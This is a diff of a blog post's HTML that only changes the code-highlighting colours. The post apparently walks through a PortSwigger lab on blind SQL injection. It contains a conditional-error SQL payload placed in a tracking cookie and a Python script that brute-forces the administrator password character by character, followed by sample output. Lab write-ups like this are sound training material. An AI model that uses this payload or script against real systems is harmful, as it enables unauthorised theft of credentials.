@@ -45,55 +45,55 @@ here on <a href=https://portswigger.net/web-security/sql-injection/blind/lab-con
 <code>xyz</code> is your cookie and <code>SUBSTR(password,1,1)='A'</code> is guessing the password
 character by character.</p><pre>
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='A' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-</pre><p>in portswigger&rsquo;s writeup they used burp intruder to automate the process. but unfortunately mitmproxy has no similar feature so i wrote python script to do it for me.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6272a4>#!/usr/bin/env python</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> requests<span style=color:#ff79c6>,</span> urllib3
-</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> string <span style=color:#ff79c6>import</span> ascii_lowercase, digits
-</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> time
+</pre><p>in portswigger&rsquo;s writeup they used burp intruder to automate the process. but unfortunately mitmproxy has no similar feature so i wrote python script to do it for me.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#888>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>requests</span><span style=color:#333>,</span> <span style=color:#0e84b5;font-weight:700>urllib3</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>string</span> <span style=color:#080;font-weight:700>import</span> ascii_lowercase, digits
+</span></span><span style=display:flex><span><span style=color:#080;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>time</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>urllib3<span style=color:#ff79c6>.</span>disable_warnings()
+</span></span><span style=display:flex><span>urllib3<span style=color:#333>.</span>disable_warnings()
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#6272a4># your challenge url</span>
-</span></span><span style=display:flex><span>url <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;https://your-challenge-url.web-security-academy.net/&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#888># your challenge url</span>
+</span></span><span style=display:flex><span>url <span style=color:#333>=</span> <span style=background-color:#fff0f0>&#34;https://your-challenge-url.web-security-academy.net/&#34;</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>proxies <span style=color:#ff79c6>=</span> {
-</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;https&#34;</span>: <span style=color:#f1fa8c>&#34;http://127.0.0.1:8080&#34;</span>
+</span></span><span style=display:flex><span>proxies <span style=color:#333>=</span> {
+</span></span><span style=display:flex><span>    <span style=background-color:#fff0f0>&#34;https&#34;</span>: <span style=background-color:#fff0f0>&#34;http://127.0.0.1:8080&#34;</span>
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>req <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>Session()
+</span></span><span style=display:flex><span>req <span style=color:#333>=</span> requests<span style=color:#333>.</span>Session()
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>abc123 <span style=color:#ff79c6>=</span> ascii_lowercase <span style=color:#ff79c6>+</span> digits
+</span></span><span style=display:flex><span>abc123 <span style=color:#333>=</span> ascii_lowercase <span style=color:#333>+</span> digits
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#6272a4># Your cookie here</span>
-</span></span><span style=display:flex><span>headers <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#34;Cookie&#34;</span>: <span style=color:#f1fa8c>&#34;TrackingId=xyz&#34;</span>}
+</span></span><span style=display:flex><span><span style=color:#888># Your cookie here</span>
+</span></span><span style=display:flex><span>headers <span style=color:#333>=</span> {<span style=background-color:#fff0f0>&#34;Cookie&#34;</span>: <span style=background-color:#fff0f0>&#34;TrackingId=xyz&#34;</span>}
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>make_query</span>(c: <span style=color:#8be9fd;font-style:italic>str</span>, count: <span style=color:#8be9fd;font-style:italic>int</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>:
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;&#39;||(SELECT CASE WHEN SUBSTR(password,1,</span><span style=color:#f1fa8c>{</span>count<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)=&#39;</span><span style=color:#f1fa8c>{</span>c<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39; THEN to_char(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-weight:700>def</span> <span style=color:#06b;font-weight:700>make_query</span>(c: <span style=color:#007020>str</span>, count: <span style=color:#007020>int</span> <span style=color:#333>=</span> <span style=color:#00d;font-weight:700>1</span>) <span style=color:#333>-&gt;</span> <span style=color:#007020>str</span>:
+</span></span><span style=display:flex><span>    <span style=color:#080;font-weight:700>return</span> <span style=background-color:#fff0f0>f</span><span style=background-color:#fff0f0>&#34;&#39;||(SELECT CASE WHEN SUBSTR(password,1,</span><span style=background-color:#eee>{</span>count<span style=background-color:#eee>}</span><span style=background-color:#fff0f0>)=&#39;</span><span style=background-color:#eee>{</span>c<span style=background-color:#eee>}</span><span style=background-color:#fff0f0>&#39; THEN to_char(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;&#34;</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>pass_len <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>20</span>
+</span></span><span style=display:flex><span>pass_len <span style=color:#333>=</span> <span style=color:#00d;font-weight:700>20</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>solve</span>() <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>:
-</span></span><span style=display:flex><span>    j <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
-</span></span><span style=display:flex><span>    count <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>while</span> <span style=color:#8be9fd;font-style:italic>len</span>(j) <span style=color:#ff79c6>!=</span> pass_len:
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> abc123:
-</span></span><span style=display:flex><span>            cookie <span style=color:#ff79c6>=</span> headers[<span style=color:#f1fa8c>&#39;Cookie&#39;</span>]<span style=color:#ff79c6>+</span>make_query(j<span style=color:#ff79c6>+</span>i, count)
-</span></span><span style=display:flex><span>            H <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#34;Cookie&#34;</span>: cookie}
-</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;Trying: </span><span style=color:#f1fa8c>{</span>H[<span style=color:#f1fa8c>&#39;Cookie&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
-</span></span><span style=display:flex><span>            x <span style=color:#ff79c6>=</span> req<span style=color:#ff79c6>.</span>get(url,
-</span></span><span style=display:flex><span>                        headers<span style=color:#ff79c6>=</span>H,
-</span></span><span style=display:flex><span>                        proxies<span style=color:#ff79c6>=</span>proxies,
-</span></span><span style=display:flex><span>                        verify<span style=color:#ff79c6>=</span><span style=color:#ff79c6>False</span>)
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> x<span style=color:#ff79c6>.</span>status_code <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>500</span>:
-</span></span><span style=display:flex><span>                count <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>1</span>
-</span></span><span style=display:flex><span>                j <span style=color:#ff79c6>+=</span> i
-</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[+] Found: </span><span style=color:#f1fa8c>{</span>i<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
-</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>print</span>(j)
-</span></span><span style=display:flex><span>                <span style=color:#ff79c6>continue</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> j
+</span></span><span style=display:flex><span><span style=color:#080;font-weight:700>def</span> <span style=color:#06b;font-weight:700>solve</span>() <span style=color:#333>-&gt;</span> <span style=color:#007020>str</span>:
+</span></span><span style=display:flex><span>    j <span style=color:#333>=</span> <span style=background-color:#fff0f0>&#39;&#39;</span>
+</span></span><span style=display:flex><span>    count <span style=color:#333>=</span> <span style=color:#00d;font-weight:700>1</span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-weight:700>while</span> <span style=color:#007020>len</span>(j) <span style=color:#333>!=</span> pass_len:
+</span></span><span style=display:flex><span>        <span style=color:#080;font-weight:700>for</span> i <span style=color:#000;font-weight:700>in</span> abc123:
+</span></span><span style=display:flex><span>            cookie <span style=color:#333>=</span> headers[<span style=background-color:#fff0f0>&#39;Cookie&#39;</span>]<span style=color:#333>+</span>make_query(j<span style=color:#333>+</span>i, count)
+</span></span><span style=display:flex><span>            H <span style=color:#333>=</span> {<span style=background-color:#fff0f0>&#34;Cookie&#34;</span>: cookie}
+</span></span><span style=display:flex><span>            <span style=color:#007020>print</span>(<span style=background-color:#fff0f0>f</span><span style=background-color:#fff0f0>&#34;Trying: </span><span style=background-color:#eee>{</span>H[<span style=background-color:#fff0f0>&#39;Cookie&#39;</span>]<span style=background-color:#eee>}</span><span style=background-color:#fff0f0>&#34;</span>)
+</span></span><span style=display:flex><span>            x <span style=color:#333>=</span> req<span style=color:#333>.</span>get(url,
+</span></span><span style=display:flex><span>                        headers<span style=color:#333>=</span>H,
+</span></span><span style=display:flex><span>                        proxies<span style=color:#333>=</span>proxies,
+</span></span><span style=display:flex><span>                        verify<span style=color:#333>=</span><span style=color:#080;font-weight:700>False</span>)
+</span></span><span style=display:flex><span>            <span style=color:#080;font-weight:700>if</span> x<span style=color:#333>.</span>status_code <span style=color:#333>==</span> <span style=color:#00d;font-weight:700>500</span>:
+</span></span><span style=display:flex><span>                count <span style=color:#333>+=</span> <span style=color:#00d;font-weight:700>1</span>
+</span></span><span style=display:flex><span>                j <span style=color:#333>+=</span> i
+</span></span><span style=display:flex><span>                <span style=color:#007020>print</span>(<span style=background-color:#fff0f0>f</span><span style=background-color:#fff0f0>&#34;[+] Found: </span><span style=background-color:#eee>{</span>i<span style=background-color:#eee>}</span><span style=background-color:#fff0f0>&#34;</span>)
+</span></span><span style=display:flex><span>                <span style=color:#007020>print</span>(j)
+</span></span><span style=display:flex><span>                <span style=color:#080;font-weight:700>continue</span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-weight:700>return</span> j
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;administrator:</span><span style=color:#f1fa8c>{</span>solve()<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
-</span></span></code></pre></div><p>i add this part to pass all the requests on mitmproxy to see how is everything going.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>proxies <span style=color:#ff79c6>=</span> {
-</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;https&#34;</span>: <span style=color:#f1fa8c>&#34;http://127.0.0.1:8080&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=background-color:#fff0f0>f</span><span style=background-color:#fff0f0>&#34;administrator:</span><span style=background-color:#eee>{</span>solve()<span style=background-color:#eee>}</span><span style=background-color:#fff0f0>&#34;</span>)
+</span></span></code></pre></div><p>i add this part to pass all the requests on mitmproxy to see how is everything going.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>proxies <span style=color:#333>=</span> {
+</span></span><span style=display:flex><span>    <span style=background-color:#fff0f0>&#34;https&#34;</span>: <span style=background-color:#fff0f0>&#34;http://127.0.0.1:8080&#34;</span>
 </span></span><span style=display:flex><span>}
 </span></span></code></pre></div><p>the script output goes like</p><pre>
 Trying: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
